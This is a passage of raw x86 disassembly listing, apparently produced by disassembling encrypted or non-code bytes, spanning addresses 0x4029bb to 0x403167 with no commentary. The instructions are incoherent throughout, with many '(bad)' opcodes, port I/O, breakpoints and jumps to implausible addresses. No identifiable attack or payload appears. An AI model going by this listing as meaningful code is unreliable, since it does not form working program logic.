  4029bb:	ja     0x4029e9
  4029bd:	adc    DWORD PTR [ecx],ebp
  4029bf:	ret    0x7dcc
  4029c2:	jmp    0x4029ff
  4029c4:	gs jo  0x40295e
  4029c7:	repz add dl,BYTE PTR [eax-0x6be9f044]
  4029ce:	inc    edx
  4029cf:	dec    ebx
  4029d0:	dec    ebx
  4029d1:	or     cl,BYTE PTR [ebp+0x23]
  4029d4:	aas    
  4029d5:	in     eax,0x5
  4029d7:	adc    BYTE PTR [eax-0x7ca60c87],cl
  4029dd:	dec    edx
  4029de:	jb     0x402a1d
  4029e0:	mul    BYTE PTR [edi+edi*8+0x11]
  4029e4:	inc    edi
  4029e5:	sahf   
  4029e6:	inc    ecx
  4029e7:	lahf   
  4029e8:	fidiv  WORD PTR [edx-0x758ccfb]
  4029ee:	cli    
  4029ef:	in     al,dx
  4029f0:	sbb    DWORD PTR [ecx-0x54],0xc9a86178
  4029f7:	xlat   BYTE PTR ds:[ebx]
  4029f8:	sub    DWORD PTR [edi],ebp
  4029fa:	fld    QWORD PTR [ebx-0x74]
  4029fd:	sub    edi,ebx
  4029ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a00:	clc    
  402a01:	popf   
  402a02:	and    DWORD PTR [ebx],0xffffffed
  402a05:	xlat   BYTE PTR ds:[ebx]
  402a06:	xor    DWORD PTR [si],0xcb4fc6ab
  402a0d:	adc    esi,DWORD PTR [ebp+0x1c]
  402a10:	loope  0x4029eb
  402a12:	mov    DWORD PTR [esi+0x3f],ebx
  402a15:	xor    eax,0x1a084a94
  402a1a:	adc    edx,DWORD PTR [edx+0x5e]
  402a1d:	pop    edi
  402a1e:	arpl   bp,cx
  402a20:	dec    esp
  402a21:	std    
  402a22:	add    esi,eax
  402a24:	inc    ebp
  402a25:	mov    edx,0x910421a8
  402a2a:	jmp    0x402a45
  402a2c:	fwait
  402a2d:	inc    esp
  402a2e:	cmp    DWORD PTR [esi+0x40ac6298],ebx
  402a34:	adc    esp,DWORD PTR [esi+0x43]
  402a37:	pmaxsw mm1,QWORD PTR [edi+0x26f8a67c]
  402a3e:	or     eax,0xf5d36d0f
  402a43:	out    0x46,al
  402a45:	lods   al,BYTE PTR ds:[esi]
  402a46:	mov    al,0x5d
  402a48:	mov    DWORD PTR [edi+edx*2],esi
  402a4b:	lahf   
  402a4c:	xchg   ebp,eax
  402a4d:	adc    al,0x2
  402a4f:	fwait
  402a50:	push   ds
  402a51:	pusha  
  402a52:	addr16 pop ebx
  402a54:	loop   0x402a05
  402a56:	pop    edi
  402a57:	(bad)  
  402a58:	test   eax,0x877f6a5a
  402a5d:	(bad)  
  402a5f:	pop    ebp
  402a60:	and    bh,al
  402a62:	adc    eax,0xd9979dae
  402a67:	jp     0x402ad8
  402a69:	jmp    0x402a39
  402a6b:	mov    edi,0xbd4b10a5
  402a70:	cmp    eax,DWORD PTR [ecx+0x68]
  402a73:	mov    al,ds:0xd30ea76
  402a78:	sub    esp,0x6a
  402a7b:	(bad)  
  402a7c:	push   eax
  402a7d:	out    0xed,al
  402a7f:	push   es
  402a80:	cwde   
  402a81:	mov    ecx,0xa7122524
  402a86:	push   ds
  402a87:	push   ebx
  402a88:	es (bad) 
  402a8a:	out    dx,eax
  402a8b:	cdq    
  402a8c:	js     0x402a73
  402a8e:	fisttp DWORD PTR [esi-0x6]
  402a91:	mul    bh
  402a93:	mov    BYTE PTR [ebp-0x3d22e897],ah
  402a99:	loopne 0x402a9e
  402a9b:	outs   dx,BYTE PTR ds:[esi]
  402a9c:	dec    edx
  402a9d:	pop    eax
  402a9e:	addr16 push 0xffffffa6
  402aa1:	inc    edi
  402aa2:	dec    esp
  402aa3:	lods   eax,DWORD PTR ds:[esi]
  402aa4:	fsub   QWORD PTR [edx+0x2c0d50d6]
  402aaa:	stc    
  402aab:	inc    edi
  402aac:	pusha  
  402aad:	mov    ds:0x9b5c9629,al
  402ab2:	lahf   
  402ab3:	pushf  
  402ab4:	add    BYTE PTR [esi+0x1e4caa97],bl
  402aba:	and    al,bl
  402abc:	mov    cl,0x7d
  402abe:	inc    ecx
  402abf:	mov    eax,0xd099e7a5
  402ac4:	xchg   ecx,eax
  402ac5:	into   
  402ac6:	pop    esi
  402ac7:	lds    edx,FWORD PTR [ebx-0x7842f39c]
  402acd:	aam    0x6c
  402acf:	(bad)  
  402ad0:	adc    dh,BYTE PTR [ebx+0x24]
  402ad3:	push   ss
  402ad4:	leave  
  402ad5:	sti    
  402ad6:	mov    esi,0x75ed571d
  402adb:	sbb    BYTE PTR [ebx],0x65
  402ade:	sbb    esi,DWORD PTR [eax-0x3f]
  402ae1:	adc    BYTE PTR [edx],ch
  402ae3:	cmp    cl,BYTE PTR [edi]
  402ae5:	outs   dx,BYTE PTR ds:[esi]
  402ae6:	mov    esi,0x14ca9aaa
  402aeb:	rcl    esp,1
  402aed:	cmp    eax,0xb6b3ddcf
  402af2:	and    BYTE PTR [ecx+0x48],cl
  402af5:	retf   0xa916
  402af8:	ins    BYTE PTR es:[edi],dx
  402af9:	sub    BYTE PTR [edi+0x1ede6b63],dh
  402aff:	scas   eax,DWORD PTR es:[edi]
  402b00:	aam    0xbe
  402b02:	xlat   BYTE PTR ds:[ebx]
  402b03:	popf   
  402b04:	iret   
  402b05:	sahf   
  402b06:	cmp    ah,BYTE PTR [ecx-0x76]
  402b09:	inc    ecx
  402b0a:	mov    ss,WORD PTR [esi+esi*2-0x47b95a91]
  402b11:	scas   eax,DWORD PTR es:[edi]
  402b12:	data16 jp 0x402ad1
  402b15:	int3   
  402b16:	xchg   ecx,eax
  402b17:	and    eax,0xfecc3f3d
  402b1c:	push   DWORD PTR [eax-0x28]
  402b1f:	daa    
  402b20:	pop    eax
  402b21:	mov    ebx,0xb745b2fe
  402b26:	ret    
  402b27:	push   cs
  402b28:	pop    esi
  402b29:	add    BYTE PTR [ecx+0x48],ch
  402b2c:	mov    ds:0xbfe10474,eax
  402b31:	jb     0x402af9
  402b33:	pushf  
  402b34:	sbb    dl,BYTE PTR [ebx+edx*2+0x6f]
  402b38:	sub    DWORD PTR [ebp+0x425c4066],esp
  402b3e:	pop    esp
  402b3f:	int3   
  402b40:	hlt    
  402b41:	pop    ecx
  402b42:	xchg   ebp,eax
  402b43:	sub    eax,0x56a9e788
  402b48:	cdq    
  402b49:	add    eax,0xfe1bd904
  402b4e:	inc    ebx
  402b4f:	nop
  402b50:	push   0xc11d94e3
  402b55:	je     0x402b2f
  402b57:	mov    DWORD PTR [edx-0x69e9f4a4],esi
  402b5d:	mov    DWORD PTR [eax+ebp*1+0x23],esi
  402b61:	shl    DWORD PTR [esi+ebx*8-0x3ec229aa],0xcd
  402b69:	mov    al,ds:0xba1119fb
  402b6e:	popa   
  402b6f:	in     al,dx
  402b70:	push   ss
  402b71:	mov    cs,ebp
  402b73:	jns    0x402b2d
  402b75:	dec    edi
  402b76:	cmp    BYTE PTR [edx+0x65],dh
  402b79:	das    
  402b7a:	mov    al,BYTE PTR [edi+0x42]
  402b7d:	aas    
  402b7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b7f:	ins    BYTE PTR es:[edi],dx
  402b80:	mov    cl,0x1d
  402b82:	xor    dh,BYTE PTR [esi]
  402b84:	push   esp
  402b85:	or     DWORD PTR ss:[eax],0x47
  402b89:	aad    0xce
  402b8b:	loop   0x402bb3
  402b8d:	xchg   esi,eax
  402b8e:	sbb    eax,0xbec6f795
  402b93:	xchg   ecx,eax
  402b94:	stos   DWORD PTR es:[edi],eax
  402b95:	inc    edi
  402b96:	iret   
  402b97:	jne    0x402bd0
  402b99:	lea    eax,[ebx-0x8]
  402b9c:	sub    ebx,edx
  402b9e:	addr16 mov edx,0xc7231320
  402ba4:	or     ah,BYTE PTR [ecx*8+0x3eb88db4]
  402bab:	data16 jb 0x402b4a
  402bae:	rcr    edi,1
  402bb0:	outs   dx,DWORD PTR ds:[esi]
  402bb1:	mov    ebx,0x83512883
  402bb6:	jge    0x402c31
  402bb8:	adc    ch,BYTE PTR [esi-0x71]
  402bbb:	fild   WORD PTR [esi+0x6143c14b]
  402bc1:	jg     0x402ba9
  402bc3:	sti    
  402bc4:	sub    BYTE PTR [ecx+0x707cff45],ch
  402bca:	or     ebp,DWORD PTR [edi+0x87496f2]
  402bd0:	(bad)  
  402bd1:	sar    DWORD PTR [ecx+0x61],1
  402bd4:	jnp    0x402bd0
  402bd6:	push   0x732f2e76
  402bdb:	jl     0x402bf8
  402bdd:	or     dl,BYTE PTR [eax-0x4df23424]
  402be3:	in     al,dx
  402be4:	cwde   
  402be5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402be6:	ficom  WORD PTR [ecx]
  402be8:	mov    ds:0x3794b30,al
  402bed:	jg     0x402bfb
  402bef:	sbb    DWORD PTR [esi-0x6a9a4c69],edx
  402bf5:	jb     0x402bcd
  402bf7:	inc    edi
  402bf8:	cmp    BYTE PTR [ebx],cl
  402bfa:	jmp    DWORD PTR [esi]
  402bfc:	dec    edx
  402bfd:	retf   
  402bfe:	add    eax,0x16aef81c
  402c03:	sub    BYTE PTR [ecx],dh
  402c05:	loope  0x402c58
  402c07:	cmp    DWORD PTR [ebp-0x2b],edi
  402c0a:	adc    BYTE PTR [ebx],dl
  402c0c:	jnp    0x402c14
  402c0e:	imul   edx,DWORD PTR [ebx+0x1860fdfd],0xffffffe9
  402c15:	icebp  
  402c16:	mov    ebp,0xe4e24ab2
  402c1b:	shl    al,1
  402c1d:	mov    eax,ds:0xcb2997cb
  402c22:	gs push esp
  402c24:	push   ss
  402c25:	jbe    0x402bba
  402c27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402c28:	in     al,dx
  402c29:	push   edi
  402c2a:	mov    cl,0xf4
  402c2c:	fst    DWORD PTR [ebx]
  402c2e:	or     eax,0x16666d24
  402c33:	lahf   
  402c34:	cld    
  402c35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402c36:	or     bh,dl
  402c38:	mul    BYTE PTR [ebx-0x7a4b4ecd]
  402c3e:	mov    dl,0x8c
  402c40:	ret    
  402c41:	inc    edi
  402c42:	pop    eax
  402c43:	mov    dh,0xe9
  402c45:	test   dh,0xb9
  402c48:	cld    
  402c49:	stos   BYTE PTR es:[edi],al
  402c4a:	in     al,dx
  402c4b:	xor    edi,DWORD PTR [ecx+ebp*2]
  402c4e:	fstp   TBYTE PTR [edx]
  402c50:	dec    edi
  402c51:	xchg   edi,eax
  402c52:	sbb    eax,0xea6e43ef
  402c57:	mov    ds:0xd50aa2c3,eax
  402c5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402c5d:	jg     0x402ccb
  402c5f:	adc    al,dl
  402c61:	pushf  
  402c62:	xchg   ebp,eax
  402c63:	retf   0x5772
  402c66:	mov    edx,DWORD PTR [esi+edi*1]
  402c69:	addr16 test al,0x4f
  402c6c:	mov    al,ds:0xb854c229
  402c71:	ja     0x402c6a
  402c73:	aad    0x1b
  402c75:	sbb    esp,edx
  402c77:	xchg   BYTE PTR [bx+0x9],bl
  402c7b:	fiadd  WORD PTR [eax-0x28]
  402c7e:	out    dx,eax
  402c7f:	and    DWORD PTR [ebx+0x2d],ecx
  402c82:	out    dx,eax
  402c83:	out    0xfc,al
  402c85:	jmp    0x7fcc43f4
  402c8a:	in     al,0xb3
  402c8c:	call   0xc422:0x3951e548
  402c93:	xchg   esi,eax
  402c94:	not    BYTE PTR [esi+0x75]
  402c97:	int    0x3c
  402c99:	cld    
  402c9a:	(bad)  
  402c9b:	icebp  
  402c9c:	push   edi
  402c9d:	in     eax,0xf9
  402c9f:	jmp    0x4bd1a76
  402ca4:	mov    cl,0x1c
  402ca6:	loope  0x402c6a
  402ca8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ca9:	pop    ecx
  402caa:	mov    esi,0x484d8fae
  402caf:	loop   0x402cca
  402cb1:	xchg   esp,eax
  402cb2:	and    ch,cl
  402cb4:	cs push ss
  402cb6:	imul   esi,DWORD PTR [ebp-0x4a8a05a3],0x65
  402cbd:	adc    BYTE PTR [esi],bl
  402cbf:	xor    eax,edx
  402cc1:	sub    ch,BYTE PTR [eax+0x18]
  402cc4:	cmp    BYTE PTR gs:[edi],0xa5
  402cc8:	test   eax,0x7c49e13f
  402ccd:	pop    esi
  402cce:	pushf  
  402ccf:	jmp    0xd36ed641
  402cd4:	leave  
  402cd5:	push   0x41
  402cd7:	pop    ds
  402cd8:	shl    DWORD PTR [ecx],cl
  402cda:	or     BYTE PTR [esi],ah
  402cdc:	mov    DWORD PTR [edi],eax
  402cde:	and    edi,ecx
  402ce0:	inc    ecx
  402ce1:	cmp    BYTE PTR [edx+0x3a69aa97],cl
  402ce7:	and    bh,BYTE PTR [edx-0x31]
  402cea:	and    DWORD PTR [ebx+0x13],edx
  402ced:	out    0x31,eax
  402cef:	mov    esi,0x4c5e57ba
  402cf4:	enter  0xb5f8,0x73
  402cf8:	ret    0x5eaa
  402cfb:	aas    
  402cfc:	sbb    esi,DWORD PTR [edx]
  402cfe:	lahf   
  402cff:	mov    esi,0xf7ef88bc
  402d04:	push   ds
  402d05:	jmp    0x2b503866
  402d0a:	or     BYTE PTR [ebx],dl
  402d0c:	sbb    dl,BYTE PTR [edi-0x30944976]
  402d12:	sub    ah,cl
  402d14:	jne    0x402d94
  402d16:	mov    al,0x41
  402d18:	(bad)  
  402d19:	int3   
  402d1a:	mov    dh,BYTE PTR [edi-0x64b12972]
  402d20:	sbb    esi,DWORD PTR [ebx]
  402d22:	repnz xchg edx,eax
  402d24:	pop    ebx
  402d25:	ss cmp al,0xb0
  402d28:	repnz cmp ch,dh
  402d2b:	div    BYTE PTR [ebp-0x636a8b62]
  402d31:	and    eax,0x1c8987d6
  402d36:	pop    es
  402d37:	dec    esp
  402d38:	fdivr  QWORD PTR [edx]
  402d3a:	stos   BYTE PTR es:[edi],al
  402d3b:	mov    edx,0x75b1ec3
  402d40:	scas   al,BYTE PTR es:[edi]
  402d41:	ret    
  402d42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d43:	in     al,dx
  402d44:	push   0x832e7108
  402d49:	dec    edi
  402d4a:	dec    ecx
  402d4b:	(bad)  
  402d4c:	adc    edi,edx
  402d4e:	push   edi
  402d4f:	ins    DWORD PTR es:[edi],dx
  402d50:	mov    ecx,edi
  402d52:	xchg   ebp,eax
  402d53:	pop    ebx
  402d54:	mov    ds:0x72f39b95,al
  402d59:	push   edx
  402d5a:	fisttp QWORD PTR [edi+0x2f]
  402d5d:	add    DWORD PTR [edx+0x7e686c8e],edx
  402d63:	stc    
  402d64:	out    dx,eax
  402d65:	inc    ebp
  402d66:	adc    BYTE PTR [eax],0xbb
  402d69:	pop    eax
  402d6a:	rol    bh,cl
  402d6c:	ins    BYTE PTR es:[edi],dx
  402d6d:	inc    esp
  402d6e:	and    BYTE PTR [edi-0x1e],bh
  402d71:	bnd jne 0x402dbc
  402d74:	int    0xf
  402d76:	adc    esi,edx
  402d78:	and    BYTE PTR [ebx-0x3996bda8],0x49
  402d7f:	pop    ss
  402d80:	xor    al,0x91
  402d82:	es cmp al,0x4e
  402d85:	inc    edx
  402d86:	call   0x762dd765
  402d8b:	(bad)  [ebp+0x9]
  402d8e:	aam    0xfc
  402d90:	or     ch,BYTE PTR [ebp+0x4b]
  402d93:	ficomp WORD PTR [edi-0x680cee77]
  402d99:	mov    fs,WORD PTR [ecx+0xd2bea97]
  402d9f:	inc    ebp
  402da0:	pop    es
  402da1:	xor    BYTE PTR [edx],0x9f
  402da4:	cwde   
  402da5:	jmp    0x378e:0xe9f0b423
  402dac:	int3   
  402dad:	sub    DWORD PTR [esi+0x13bcb232],0x258111ac
  402db7:	pop    esp
  402db8:	clc    
  402db9:	(bad)  
  402dba:	fadd   st(4),st
  402dbc:	xchg   ebx,eax
  402dbd:	add    al,0x20
  402dbf:	and    eax,DWORD PTR [edx+0x1f55b7a0]
  402dc5:	mov    ebp,0x56286598
  402dca:	cmp    BYTE PTR [edi+0xfccb72b],0x8f
  402dd1:	jnp    0x402e32
  402dd3:	adc    ch,BYTE PTR [ebp-0x55]
  402dd6:	sub    eax,0xe3848daf
  402ddb:	ins    DWORD PTR es:[edi],dx
  402ddc:	adc    dl,ch
  402dde:	xchg   edx,eax
  402ddf:	jbe    0x402d81
  402de1:	pop    ds
  402de2:	sub    ebp,eax
  402de4:	pushf  
  402de5:	lds    esi,FWORD PTR [edi-0x1b]
  402de8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402de9:	push   edx
  402dea:	retf   
  402deb:	aam    0xf8
  402ded:	(bad)  
  402dee:	aas    
  402def:	xor    DWORD PTR [ebp+0x31],esi
  402df2:	pop    esi
  402df3:	shl    BYTE PTR [eax],cl
  402df5:	clc    
  402df6:	ss jl  0x402e63
  402df9:	dec    eax
  402dfa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402dfb:	sar    DWORD PTR [ebp-0x10ad07b0],1
  402e01:	mov    ah,0x28
  402e03:	fistp  DWORD PTR [edi]
  402e05:	mov    BYTE PTR [ebp-0x18],ch
  402e08:	das    
  402e09:	adc    ebp,esi
  402e0b:	call   0xf049928d
  402e10:	mov    al,0x2b
  402e12:	pop    es
  402e13:	xchg   ebp,eax
  402e14:	nop
  402e15:	sbb    BYTE PTR [ebp+ebp*2+0x68],0xb8
  402e1a:	sub    edx,DWORD PTR [edi]
  402e1c:	aam    0xb
  402e1e:	adc    eax,0xe7fcb9
  402e23:	ss cld 
  402e25:	push   eax
  402e26:	sbb    BYTE PTR gs:[eax+0x7b],dh
  402e2a:	push   0x8922016
  402e2f:	jl     0x402e62
  402e31:	fiadd  WORD PTR [edx-0x126d967]
  402e37:	jns    0x402e16
  402e39:	bnd jge 0x402e00
  402e3c:	jmp    0xfc96c0b8
  402e41:	sbb    esi,DWORD PTR [esi+0x3bc67438]
  402e47:	push   0x782d9109
  402e4c:	jl     0x402e38
  402e4e:	add    BYTE PTR [eax],ah
  402e50:	xor    eax,0xaa69082a
  402e55:	jmp    0x2599:0x3a365ef7
  402e5c:	mov    WORD PTR [esi],?
  402e5e:	ffree  st(4)
  402e60:	fwait
  402e61:	xchg   DWORD PTR ds:0xfa9d1d83,esi
  402e67:	mov    edi,0xe61294b0
  402e6c:	gs aad 0x1b
  402e6f:	push   cs
  402e70:	inc    esp
  402e71:	ins    DWORD PTR es:[edi],dx
  402e72:	rol    BYTE PTR [esi-0x5c],cl
  402e75:	push   ebp
  402e76:	add    dl,dh
  402e78:	stos   DWORD PTR es:[edi],eax
  402e79:	inc    eax
  402e7a:	fcom   DWORD PTR [ebp+0x400fe60e]
  402e80:	push   ebx
  402e81:	dec    esp
  402e82:	mov    ecx,0x6c8e1452
  402e87:	jne    0x402e90
  402e89:	test   eax,0xb2998965
  402e8e:	iret   
  402e8f:	add    BYTE PTR ds:0xc045bdc,bl
  402e95:	in     al,dx
  402e96:	and    al,0x84
  402e98:	xlat   BYTE PTR ds:[ebx]
  402e99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e9a:	vpavgw xmm1,xmm0,xmm4
  402e9e:	inc    esp
  402e9f:	sbb    DWORD PTR [ecx-0x5860fe05],esp
  402ea5:	mov    dh,0xf2
  402ea7:	mov    edi,0x76a16fca
  402eac:	jge    0x402ec8
  402eae:	adc    cl,BYTE PTR [ebp-0x6c9f4960]
  402eb4:	add    edx,DWORD PTR [ebx+0xf]
  402eb7:	imul   eax,edx,0x7dd32f47
  402ebd:	push   edi
  402ebe:	jmp    0x153a1234
  402ec3:	aad    0x62
  402ec5:	sahf   
  402ec6:	cs inc eax
  402ec8:	sbb    al,0x97
  402eca:	retf   0xecbd
  402ecd:	pop    ecx
  402ece:	cmc    
  402ecf:	int3   
  402ed0:	push   ds
  402ed1:	pop    ebx
  402ed2:	dec    edi
  402ed3:	je     0x402e97
  402ed5:	dec    esi
  402ed6:	sbb    DWORD PTR [ecx+0x17da0ae5],0x68ebe4e0
  402ee0:	dec    ebp
  402ee1:	sbb    eax,DWORD PTR [ecx-0x42]
  402ee4:	mov    DWORD PTR [ecx+ebp*8-0x68],0xdbd2e4c7
  402eec:	mov    edi,0xf0fc79f6
  402ef1:	aaa    
  402ef2:	dec    ecx
  402ef3:	sti    
  402ef4:	sub    dh,BYTE PTR [esp+eax*4+0x31647510]
  402efb:	fnstcw WORD PTR ds:0x904d95e9
  402f01:	jb     0x402f3c
  402f03:	sub    esi,DWORD PTR [ebx-0x54aad599]
  402f09:	dec    esp
  402f0a:	push   ebp
  402f0b:	test   al,0x17
  402f0d:	jne    0x402ea4
  402f0f:	aas    
  402f10:	jge    0x402f3b
  402f12:	sub    al,0xa3
  402f14:	push   ds
  402f15:	(bad)  
  402f16:	fdiv   QWORD PTR [edx]
  402f18:	push   ecx
  402f19:	shr    DWORD PTR [ebx+0x65],0x96
  402f1d:	add    eax,0xd636c630
  402f22:	jmp    0xae3b13ad
  402f27:	cwde   
  402f28:	paddb  mm4,mm0
  402f2b:	scas   eax,DWORD PTR es:[edi]
  402f2c:	out    0xcb,al
  402f2e:	sbb    BYTE PTR [ebx+ebp*8],al
  402f31:	or     eax,0x72540d1c
  402f36:	xlat   BYTE PTR ds:[ebx]
  402f37:	fcomp  QWORD PTR [edi+0x1d]
  402f3a:	mov    DWORD PTR [esi-0x3],0xc58b4e51
  402f41:	lds    eax,FWORD PTR [edx]
  402f43:	push   ebp
  402f44:	in     eax,0xfd
  402f46:	or     BYTE PTR [ebx-0x2b],bl
  402f49:	dec    ebx
  402f4a:	fmul   DWORD PTR [ebp-0x38]
  402f4d:	jmp    0x402ee7
  402f4f:	out    dx,al
  402f50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f51:	and    eax,0xf72d1ec1
  402f56:	xchg   BYTE PTR ds:0x7feaf6bf,bh
  402f5c:	or     esp,DWORD PTR [esp+ecx*1]
  402f5f:	pop    esi
  402f60:	mov    eax,ds:0x8df81d6a
  402f65:	cld    
  402f66:	jmp    0x402f8b
  402f68:	mov    cs,WORD PTR [ecx+0x6148f256]
  402f6e:	sub    dh,bl
  402f70:	mov    esp,0x65f2c5c1
  402f75:	test   DWORD PTR [ebx-0x329ad12f],ecx
  402f7b:	ficomp WORD PTR [eax]
  402f7d:	xor    DWORD PTR [edx+ebp*2-0x3b],edi
  402f81:	cld    
  402f82:	(bad)
  402f86:	push   ecx
  402f87:	add    al,dl
  402f89:	cmc    
  402f8a:	cs jge 0x402f5b
  402f8d:	push   ecx
  402f8e:	mov    cl,0xe8
  402f90:	les    ecx,FWORD PTR [ebx-0x7f]
  402f93:	xor    eax,0xfaaf1161
  402f98:	push   esi
  402f99:	call   0xc481:0x898f4a66
  402fa0:	mov    ebp,0x7d7603bc
  402fa5:	out    0xad,eax
  402fa7:	shl    ebp,cl
  402fa9:	and    al,0x67
  402fab:	pop    edx
  402fac:	fild   WORD PTR [edi-0x53]
  402faf:	xchg   ebp,eax
  402fb0:	loop   0x402f7c
  402fb2:	mov    ds:0x3afa0f88,al
  402fb7:	dec    edi
  402fb8:	cli    
  402fb9:	push   ecx
  402fba:	sbb    ebx,ebp
  402fbc:	ret    0x54d
  402fbf:	mov    edx,0xa2928948
  402fc4:	xor    al,0xc8
  402fc6:	fstp   st(3)
  402fc8:	mov    ah,0xd8
  402fca:	stc    
  402fcb:	arpl   WORD PTR [edi+0x25],cx
  402fce:	or     al,0xc2
  402fd0:	push   eax
  402fd1:	into   
  402fd2:	fwait
  402fd3:	dec    eax
  402fd4:	call   FWORD PTR [eax+edi*2]
  402fd7:	loop   0x402fc8
  402fd9:	stos   DWORD PTR es:[edi],eax
  402fda:	dec    edi
  402fdb:	mov    ebx,DWORD PTR [edi]
  402fdd:	xlat   BYTE PTR ds:[ebx]
  402fde:	mov    BYTE PTR [esi-0x43],0x96
  402fe2:	cmp    eax,0xfa58dd1f
  402fe7:	retf   0x1bf1
  402fea:	pushf  
  402feb:	fnsave [eax]
  402fed:	add    dh,BYTE PTR [esi-0x70]
  402ff0:	(bad)  
  402ff1:	je     0x402fc9
  402ff3:	jp     0x403015
  402ff5:	cmp    DWORD PTR [ebp+0x2d],esi
  402ff8:	nop
  402ff9:	inc    eax
  402ffa:	xchg   esp,eax
  402ffb:	jne    0x402f82
  402ffd:	jmp    0x2b599913
  403002:	cmp    ecx,DWORD PTR [esi-0x32c5083b]
  403008:	sub    al,0xb6
  40300a:	push   edx
  40300b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40300c:	gs cwde 
  40300e:	jp     0x402f96
  403010:	icebp  
  403011:	fst    QWORD PTR [edi]
  403013:	cmp    BYTE PTR [eax+0x18],bl
  403016:	jmp    0x502c5c56
  40301b:	sbb    al,0x5a
  40301d:	mov    esp,0x428f2de7
  403022:	das    
  403023:	push   cs
  403024:	cmc    
  403025:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403026:	xor    al,0x4a
  403028:	js     0x40300f
  40302a:	nop
  40302b:	mov    al,ds:0xa01232d7
  403030:	iret   
  403031:	xor    eax,0x14c68722
  403036:	int    0xe5
  403038:	pop    ss
  403039:	outs   dx,DWORD PTR ds:[esi]
  40303a:	add    al,0xe1
  40303c:	cmp    BYTE PTR ds:0x66ac9c31,dh
  403042:	test   eax,0x9921f0b0
  403047:	(bad)  
  403048:	fistp  QWORD PTR [edi]
  40304a:	rcl    BYTE PTR [ebx],cl
  40304c:	fisubr WORD PTR [edi-0x365a984f]
  403052:	adc    al,BYTE PTR ds:0xdb6a2cdc
  403058:	ret    
  403059:	iret   
  40305a:	(bad)  
  40305b:	inc    ebx
  40305c:	adc    DWORD PTR [esi],edx
  40305e:	pushf  
  40305f:	inc    edi
  403060:	into   
  403061:	inc    ebx
  403062:	jp     0x403084
  403064:	loopne 0x4030b1
  403066:	pop    eax
  403067:	repz out 0x7e,eax
  40306a:	lds    edx,FWORD PTR [eax-0x30]
  40306d:	out    dx,al
  40306e:	xchg   ebp,eax
  40306f:	jp     0x403044
  403071:	mov    ebx,0xee24c5d9
  403076:	sub    DWORD PTR [ecx],esi
  403078:	cwde   
  403079:	xchg   esp,eax
  40307a:	in     al,0x3a
  40307c:	in     eax,0x1b
  40307e:	pavgw  mm3,mm0
  403081:	test   ecx,0xf167c08a
  403087:	add    ah,al
  403089:	push   0xffffff91
  40308b:	(bad)
  40308e:	imul   edx,DWORD PTR [ebx],0x3bc8a682
  403094:	jmp    0x6dcd6383
  403099:	cmp    eax,0xb9195988
  40309e:	fsqrt  
  4030a0:	xchg   ebx,eax
  4030a1:	fcmovnb st,st(7)
  4030a3:	pusha  
  4030a4:	sub    BYTE PTR [edx+edx*1-0x77],ah
  4030a8:	pushw  ds
  4030aa:	jmp    0xa7151462
  4030af:	rol    DWORD PTR [ebx-0x6b],0xf6
  4030b3:	faddp  st(5),st
  4030b5:	xchg   edi,eax
  4030b6:	sbb    edx,ecx
  4030b8:	sub    eax,0xb0097635
  4030bd:	(bad)
  4030c1:	out    0xb6,al
  4030c3:	inc    esi
  4030c4:	lods   eax,DWORD PTR ds:[esi]
  4030c5:	aam    0x87
  4030c7:	push   ecx
  4030c8:	outs   dx,BYTE PTR gs:[esi]
  4030ca:	jbe    0x4030c8
  4030cc:	nop
  4030cd:	test   eax,0x6c25283b
  4030d2:	mov    ds:0x2fbf8ca6,eax
  4030d7:	jb     0x403128
  4030d9:	test   edi,eax
  4030db:	bound  ecx,QWORD PTR [ebp-0x29]
  4030de:	inc    esi
  4030df:	scas   eax,DWORD PTR es:[edi]
  4030e0:	sub    DWORD PTR ds:0x6322,ebp
  4030e5:	jecxz  0x403116
  4030e7:	clc    
  4030e8:	enter  0xe53f,0xa6
  4030ec:	mov    esi,0x164084a1
  4030f1:	mov    ecx,0xe884e7f3
  4030f6:	stos   BYTE PTR es:[edi],al
  4030f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4030f9:	xchg   bl,al
  4030fb:	adc    al,0xdb
  4030fd:	pop    esp
  4030fe:	loope  0x403154
  403100:	mov    DWORD PTR [ecx],0xc43018d0
  403106:	sbb    BYTE PTR [ebp+0x3fdd527f],cl
  40310c:	bound  eax,QWORD PTR [ebp-0x20924f25]
  403112:	inc    edi
  403113:	lods   al,BYTE PTR ds:[esi]
  403114:	leave  
  403115:	inc    ebp
  403116:	rol    BYTE PTR [ebx+0x5c],1
  403119:	mov    bl,0xfd
  40311b:	xchg   BYTE PTR [esi+ecx*2+0x2c],dl
  40311f:	cmp    cl,bl
  403121:	cwde   
  403122:	iret   
  403123:	fbstp  TBYTE PTR [eax-0x13]
  403126:	ins    BYTE PTR es:[edi],dx
  403127:	inc    edx
  403128:	js     0x4030e3
  40312a:	mov    bl,0x79
  40312c:	and    eax,edx
  40312e:	outs   dx,DWORD PTR ds:[esi]
  40312f:	jmp    0x4031ab
  403131:	popf   
  403132:	xchg   ecx,eax
  403133:	jno    0x403151
  403135:	dec    esi
  403136:	into   
  403137:	and    esi,ebx
  403139:	dec    esp
  40313a:	nop
  40313b:	aam    0x65
  40313d:	dec    ebx
  40313e:	pop    esp
  40313f:	(bad)  
  403140:	mul    BYTE PTR [edi-0x79]
  403143:	popf   
  403144:	imul   ebp,DWORD PTR [esi-0x54],0xd251c648
  40314b:	dec    ebx
  40314c:	pop    eax
  40314d:	cmp    eax,0x38b67a51
  403152:	out    0x3c,eax
  403154:	mov    ecx,0x7f0e7719
  403159:	in     eax,0x7d
  40315b:	cli    
  40315c:	or     eax,0x5e86bcd4
  403161:	jecxz  0x4030eb
  403163:	(bad)  
  403164:	retf   
  403165:	adc    ah,al
  403167:	out    dx,al
